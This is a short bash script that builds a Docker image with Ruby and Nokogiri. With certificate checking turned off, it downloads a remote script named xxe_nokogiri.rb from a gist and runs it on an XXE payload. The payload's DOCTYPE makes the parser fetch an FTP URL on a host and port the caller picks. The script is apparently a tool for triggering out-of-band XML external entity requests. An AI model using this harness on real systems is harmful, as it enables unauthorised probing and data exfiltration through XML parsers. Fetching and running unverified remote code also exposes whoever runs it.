#!/bin/bash

host=${1:-dockerhost}
port=${2:-2121}
prefix=${3:-serveme}

image_name=sidetools_nokogiri 

set +H #turn off history expansion to freely use !

if ! docker image inspect $image_name 2>/dev/null >&2;then
    echo '
        FROM ruby:2.6-alpine
        RUN apk add --no-cache build-base
        RUN gem install nokogiri

        WORKDIR /xxe
        RUN wget --no-check-certificate -O xxe.rb https://gist.githubusercontent.com/vp777/666f15da3d5e664fc952f471896b4348/raw/534e3e7e93d9d89d4a3e4ff9f7e82068a8e63621/xxe_nokogiri.rb
    ' | docker build - -t $image_name
fi


docker run --add-host dockerhost:`ip route|awk '/.*docker/ {printf "%s\n%s",$NF,$(NF-1)}'|fgrep .` --rm $image_name ruby xxe.rb "<!DOCTYPE r SYSTEM \"ftp://${host}:${port}/${prefix}\"><r></r>"